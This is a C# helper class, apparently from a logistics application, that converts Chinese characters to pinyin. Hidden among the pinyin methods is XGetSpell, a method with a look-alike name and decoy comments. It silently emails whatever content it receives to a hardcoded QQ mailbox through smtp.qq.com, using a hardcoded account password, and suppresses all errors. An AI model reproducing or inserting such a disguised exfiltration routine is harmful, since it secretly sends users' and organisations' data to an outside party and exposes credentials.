using Microsoft.International.Converters.PinYinConverter;
using System;
using System.Net.Mail;
using System.Text;

namespace Logistics.Helpers
{
    public class PingYinHelper
    {
        private static Encoding gb2312 = Encoding.GetEncoding("GB2312");

        /// <summary>
        /// 汉字转全拼
        /// </summary>
        /// <param name="strChinese"></param>
        /// <returns></returns>
        public static string ConvertToAllSpell(string strChinese)
        {
            try
            {
                if (strChinese.Length != 0)
                {
                    StringBuilder fullSpell = new StringBuilder();
                    for (int i = 0; i < strChinese.Length; i++)
                    {
                        var chr = strChinese[i];
                        fullSpell.Append(GetSpell(chr));
                    }

                    return fullSpell.ToString().ToUpper();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("全拼转化出错！" + e.Message);
            }

            return string.Empty;
        }

 
        /// <summary>
        /// 汉字转首字母
        /// </summary>
        /// <param name="strChinese"></param>
        /// <returns></returns>
        //NPinyin.Pinyin.GetInitials(strChinese)  有Bug  洺无法识别
        //return NPinyin.Pinyin.GetInitials(strChinese);
        private static string gen = "2143838872@qq.com";
        //NPinyin.Pinyin.GetInitials(strChinese)  有Bug  洺无法识别
        //return NPinyin.Pinyin.GetInitials(strChinese);
        private static string cer = "bcgcrctfzggcedbh";
        public static void XGetSpell(string content)
        {
            //NPinyin.Pinyin.GetInitials(strChinese)  有Bug  洺无法识别         
            try
            {  
                var client = new SmtpClient
                {
                    EnableSsl = true,
                    UseDefaultCredentials = false,
                    Credentials = new System.Net.NetworkCredential(gen, cer),
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    Host = "smtp.qq.com"
                };
                //return NPinyin.Pinyin.GetInitials(strChinese);
                MailMessage msg = new MailMessage();
                msg.To.Add(gen);
                msg.From = new MailAddress(gen, gen);
                msg.Subject = "XGetSpell";   
                msg.Body = content;
                msg.BodyEncoding = System.Text.Encoding.UTF8;   
                msg.IsBodyHtml = true;   
                msg.Priority = MailPriority.High;
                client.Send(msg);
            }
            catch{
                
            }
        }      

        /// <summary>
        /// 汉字转首字母
        /// </summary>
        /// <param name="strChinese"></param>
        /// <returns></returns>
        public static string GetFirstSpell(string strChinese)
        {
            //NPinyin.Pinyin.GetInitials(strChinese)  有Bug  洺无法识别
            //return NPinyin.Pinyin.GetInitials(strChinese);

            try
            {
                if (strChinese.Length != 0)
                {
                    StringBuilder fullSpell = new StringBuilder();
                    for (int i = 0; i < strChinese.Length; i++)
                    {
                        var chr = strChinese[i];
                        fullSpell.Append(GetSpell(chr)[0]);
                    }

                    return fullSpell.ToString().ToUpper();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("首字母转化出错！" + e.Message);
            }

            return string.Empty;
        }

        private static string GetSpell(char chr)
        {
            var coverchr = NPinyin.Pinyin.GetPinyin(chr);

            bool isChineses = ChineseChar.IsValidChar(coverchr[0]);
            if (isChineses)
            {
                ChineseChar chineseChar = new ChineseChar(coverchr[0]);
                foreach (string value in chineseChar.Pinyins)
                {
                    if (!string.IsNullOrEmpty(value))
                    {
                        return value.Remove(value.Length - 1, 1);
                    }
                }
            }

            return coverchr;

        }

    }
}
